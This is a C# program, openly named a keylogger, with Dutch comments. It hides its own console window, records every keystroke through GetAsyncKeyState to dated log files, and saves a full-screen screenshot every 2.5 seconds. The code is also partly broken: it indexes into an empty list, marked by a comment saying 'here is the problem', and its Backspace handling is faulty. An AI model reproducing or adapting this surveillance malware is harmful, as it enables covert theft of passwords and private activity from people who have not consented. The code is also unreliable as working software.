using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;




namespace keylogger
{
    class Program
    {

        #region [strings en anderen shit]

        private static int teller;
        private static DateTime datum = DateTime.Now;
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        private static decimal hour ;
        private static decimal minuten ;
        private static decimal seconde ;

        #endregion

        #region [windows hide]
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        
        
        static int SW_HIDE = 0;
        #endregion

        static void Main(string[] args)
        {
            IntPtr myWindow = GetConsoleWindow();
            ShowWindow(myWindow, SW_HIDE);

            Thread o1 = new Thread(logkeys);
            Thread o2 = new Thread(aantal);

            o1.Start();
            o2.Start();
        }

        #region [ aantal screenshots]
        private static void aantal()
        {
            for (int i = 0; i < 500000000; i++)
            {


                DateTime TimeNow = DateTime.Now;
                hour = TimeNow.Hour;
                minuten = TimeNow.Minute;
                seconde = TimeNow.Second;
                teller = 0;
                teller += i;
                printscreen();
            }
        }

        #endregion

        #region [printscreens]
        private static void printscreen()
        {
            Thread.Sleep(2500);
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                
                string folderName = @"D:/keylogger/screenshot/";
                string pathString = System.IO.Path.Combine(folderName, ""+datum.ToShortDateString()+"/");
                System.IO.Directory.CreateDirectory(pathString);
                bitmap.Save(pathString + hour + "." + minuten + "." + seconde + ".jpeg", ImageFormat.Jpeg);


            }
        }

        #endregion

        #region [keylogger]
        static void logkeys()
        {

            
            string path = (@"D:/keylogger/keylog/"+ datum.ToShortDateString() + ".text");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                }
            }
            KeysConverter converter = new KeysConverter();
            string text = "";


            
            while (true)
            {

                Thread.Sleep(10);

                 for(Int32 i = 0; i<255; i++)
                 {

                    int key = GetAsyncKeyState(i);

                    if (key == 1 || key == -32767)
                    {

                        text = converter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {

                            // hier is het probleem
                            List<string> textlist = new List<string>();
                            textlist[0] = text;

                            if (text == "Space")
                            {

                                sw.Write(" ");

                            }
                            else if (text == "Enter")
                            {
                                sw.Write(" " + datum.ToLongTimeString());
                                sw.Write(Environment.NewLine);

                            }
                            else if (text == "Back")
                            {
                                
                                sw.Write(text.Remove(text.Length - 1, 1));

                            }
                            else
                            {

                                sw.Write(text);
                            }
                            

                        }
                        break;
                    }

                 }

            }
            
        }
        #endregion

    }
}
